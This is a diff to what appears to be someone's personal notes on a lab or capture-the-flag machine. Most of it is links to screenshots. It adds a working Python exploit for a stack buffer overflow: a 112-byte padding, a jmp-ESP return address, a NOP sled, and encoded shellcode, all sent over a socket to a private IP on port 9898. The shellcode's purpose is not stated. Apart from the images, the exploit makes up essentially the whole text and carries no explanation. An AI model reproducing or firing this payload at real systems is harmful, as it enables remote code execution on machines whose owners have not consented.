@@ -1,4 +1,3 @@
-117
 
 ![[Pasted image 20230913162208.png]]
 ![[Pasted image 20230913163101.png]]
@@ -120,4 +119,63 @@ all debelopers are request to visit the server regulary for checking lastest ann
 ![[Pasted image 20231114141628.png]]
 ![[Pasted image 20231114142951.png]]
 ![[Pasted image 20231114143157.png]]
+![[Pasted image 20231123114209.png]]![[Pasted image 20231123114311.png]]
+![[Pasted image 20231123114703.png]]
+![[Pasted image 20231123114728.png]]
+![[Pasted image 20231123114936.png]]
+![[Pasted image 20231123115118.png]]
+![[Pasted image 20231123115532.png]]
+![[Pasted image 20231123124540.png]]
+![[Pasted image 20231123124920.png]]
+![[Pasted image 20231123124942.png]]
+![[Pasted image 20231123125120.png]]
+![[Pasted image 20231123125331.png]]
+![[Pasted image 20231123131403.png]]
+![[Pasted image 20231123131816.png]]
+![[Pasted image 20231123134836.png]]
 
+
+import socket
+
+offset = 112
+before_eip = b"A" * offset
+
+eip = b"\x55\x9d\x04\x08"  # 8049d55 -> jmp ESP
+
+shellcode = b""
+shellcode += b"\xbf\xf5\xf9\x13\x86\xda\xc2\xd9\x74\x24\xf4"
+shellcode += b"\x5a\x29\xc9\xb1\x12\x83\xea\xfc\x31\x7a\x0e"
+shellcode += b"\x03\x8f\xf7\xf1\x73\x5e\xd3\x01\x98\xf3\xa0"
+shellcode += b"\xbe\x35\xf1\xaf\xa0\x7a\x93\x62\xa2\xe8\x02"
+shellcode += b"\xcd\x9c\xc3\x34\x64\x9a\x22\x5c\xb7\xf4\x4c"
+shellcode += b"\x04\x5f\x07\x6f\x35\x1b\x8e\x8e\x85\x3d\xc1"
+shellcode += b"\x01\xb6\x72\xe2\x28\xd9\xb8\x65\x78\x71\x2d"
+shellcode += b"\x49\x0e\xe9\xd9\xba\xdf\x8b\x70\x4c\xfc\x19"
+shellcode += b"\xd0\xc7\xe2\x2d\xdd\x1a\x64"
+
+after_eip = b"\x90" * 32 + shellcode  # ESP
+
+payload = before_eip + eip + after_eip
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.153.156", 9898))
+s.send(payload)
+
+ Agregar un bucle infinito para mantener la conexión abierta
+while True:
+    data = s.recv(1024)
+    if not data:
+        break
+    print(data.decode("utf-8"))
+
+s.close()
+
+
+![[Pasted image 20231123142700.png]]
+![[Pasted image 20231123150302.png]]
+![[Pasted image 20231123153652.png]]
+![[Pasted image 20231123153830.png]]
+![[Pasted image 20231123154053.png]]
+
+![[Pasted image 20231123154247.png]]
+![[Pasted image 20231123154348.png]]
